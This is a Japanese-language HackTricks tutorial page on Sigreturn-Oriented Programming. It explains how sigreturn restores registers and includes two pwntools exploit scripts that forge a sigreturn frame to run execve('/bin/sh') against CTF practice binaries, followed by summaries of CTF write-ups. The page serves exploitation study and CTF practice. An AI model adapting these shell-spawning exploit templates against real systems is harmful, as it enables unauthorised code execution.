# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)で**フォロー**する。
- **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## 基本情報

**`Sigreturn`** は、主にシグナルハンドラが実行を完了した後のクリーンアップに使用される特別な **シスコール** です。シグナルは、オペレーティングシステムによってプログラムに送信される割り込みであり、通常は何らかの例外的な状況が発生したことを示すために送信されます。プログラムがシグナルを受信すると、現在の作業を一時停止して、シグナルを処理するための **シグナルハンドラ** と呼ばれる特別な関数で処理します。

シグナルハンドラが終了した後、プログラムは何も起こらなかったかのように **以前の状態に戻る必要があります。** ここで **`sigreturn`** が登場します。これにより、プログラムは **シグナルハンドラから戻り**、シグナルハンドラで使用されたスタックフレーム（関数呼び出しとローカル変数を格納するメモリセクション）をクリーンアップしてプログラムの状態を復元できます。

興味深いのは、**`sigreturn`** がプログラムの状態を復元する方法です：これは、**CPUのすべてのレジスタ値をスタックに保存することで行います。** シグナルがブロックされなくなると、**`sigreturn` はこれらの値をスタックからポップ**して、効果的にCPUのレジスタをシグナルが処理される前の状態にリセットします。これには、スタックポインタレジスタ（RSP）も含まれます。これは現在のスタックのトップを指すレジスタです。

{% hint style="danger" %}
ROPチェーンから **`sigreturn`** を呼び出し、**スタックにロードしたいレジストリ値を追加**することで、すべてのレジスタ値を **制御** し、そのために例えば `/bin/sh` で `execve` シスコールを呼び出すことが可能です。
{% endhint %}

これは、他の Ret2syscall を呼び出すためのパラメータを制御しやすくする **Ret2syscall の一種** であることに注意してください：

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

興味がある場合は、後で値を回復するためにスタックに保存される **sigcontext 構造** を見てみてください（[**こちら**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)の図表から）。
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
より詳しい説明はこちらをチェックしてください:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## 例

[**こちらの例**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop)で、signeturnへの呼び出しがROPを介して構築されているのがわかります（rxaに値`0xf`を入れる）。ただし、これはそこからの最終的なエクスプロイトです:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
以下は、バイナリがすでに`sigreturn`を呼び出していたため、**ROP**を構築する必要がない場所からの[**exploitはこちら**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)をチェックしてください。
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## その他の例と参考文献

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **スタックに書き込み**を許可し、その後**`sigreturn`**シスコールを呼び出すアセンブリバイナリ。**sigreturn**構造を介して**[**ret2syscall**](../rop-syscall-execv/)**をスタックに書き込み、バイナリのメモリ内にあるフラグを読み取ることが可能です。
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **スタックに書き込み**を許可し、その後**`sigreturn`**シスコールを呼び出すアセンブリバイナリ。**sigreturn**構造を介して**[**ret2syscall**](../rop-syscall-execv/)**をスタックに書き込むことが可能です（バイナリには文字列 `/bin/sh` が含まれています）。
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64ビット、relroなし、canaryなし、nx、pieなし。`gets`関数を悪用したシンプルなバッファオーバーフローで、**[**ret2syscall**](../rop-syscall-execv/)**を実行します。ROPチェーンは、再度getsを呼び出して`.bss`に`/bin/sh`を書き込み、**`alarm`**関数を悪用してeaxを`0xf`に設定して**SROP**を呼び出し、シェルを実行します。
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64ビットアセンブリプログラム、relroなし、canaryなし、nx、pieなし。フローはスタックに書き込み、複数のレジスタを制御し、シスコールを呼び出してから`exit`を呼び出します。選択されたシスコールは`sigreturn`で、レジスタを設定し、`eip`を以前のシスコール命令を呼び出して`memprotect`を実行してバイナリスペースを`rwx`に設定し、ESPをバイナリスペースに設定します。フローに従うと、プログラムは再度ESPにreadを呼び出しますが、この場合ESPは次の命令を指すようになるため、シェルコードを渡すと次の命令として書き込まれ、実行されます。
* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
* SROPは、シェルコードが配置された場所に実行権限（memprotect）を与えるために使用されます。
